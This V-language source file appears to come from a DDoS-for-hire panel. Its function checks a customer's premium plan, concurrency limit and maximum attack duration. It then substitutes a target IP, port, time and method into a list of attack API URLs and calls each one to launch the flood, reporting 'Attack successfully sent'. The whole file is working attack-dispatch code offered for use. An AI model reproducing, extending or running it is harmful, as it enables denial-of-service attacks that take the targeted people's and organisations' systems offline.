module attack_system

import mysql
import net.http

import crud

// pub fn wfx_send_api_attack(ip string, port string, time string, method string, user_info map[string]string, mut sql mysql.Connection, api_names []string, api_urls []string) {
// 	send_api_attack(ip, port, time, method, user_info, mut sql, api_names, api_urls)
// }

pub fn send_api_attack(ip string, port string, time string, method string, user_info map[string]string, mut sql mysql.Connection, api_names []string, api_urls []string) (int, string) {
	// mut attack_msg := ""
	// if user_info['ongoing'] < user_info['conn'] {
	// 	if time.int() < user_info['maxtime'].int() {
	// 		for i, api in api_urls {
	// 			mut fixed := api.replace("[HOST]", ip)
	// 			fixed = fixed.replace("[PORT]", port)
	// 			fixed = fixed.replace("[TIME]", time)
	// 			fixed = fixed.replace("[METHOD]", method)
	// 			attack_msg += "[+] Attack successfully sent to ${ip}:${port} for {$time} seconds with ${method} on ${api_names[i]}\r\n"
	// 			http.get_text(fixed)
	// 		}
	// 	} else {
	// 		return "[x] Error, You tried to attack an IP over the your maxtime plan. Try again with a lower time count\r\n"
	// 	}
	// } else {
	// 	return "[x] Error, You have reached you're maximum concurrents. Please wait to send attack again....\r\n"
	// }
	// return attack_msg

	mut attack_msg := ""
	println(user_info)
	if user_info['plan'].int() > 0 {
		println("here 1")
		if user_info['ongoing'] < user_info['conn'] {
			println("here 2")
			if time.int() < user_info['maxtime'].int() {
				println("here 3")
				for i, api in api_urls {
					println(api)
					mut fixed := api.replace("[HOST]", ip)
					fixed = fixed.replace("[PORT]", port)
					fixed = fixed.replace("[TIME]", time)
					fixed = fixed.replace("[METHOD]", method)
					attack_msg += "[+] Attack successfully sent to ${ip}:${port} for {$time} seconds with ${method} on ${api_names[i]}\r\n"
					lul := http.get_text(fixed)
					println(lul)
				}
			} else {
				println("Max Time")
				return -1, "[x] Error, You tried to attack an IP over the your maxtime plan. Try again with a lower time count\r\n"
			}
		} else {
			println("Max Conn")
			return -1, "[x] Error, You have reached you're maximum concurrents. Please wait to send attack again....\r\n"
		}
	} else {
		println("Not premium")
		return -1, "[x] Error, You are not premium to send attack!"
	}
	if attack_msg.len > 0 {
		return 1, attack_msg
	}
	return 0, attack_msg
}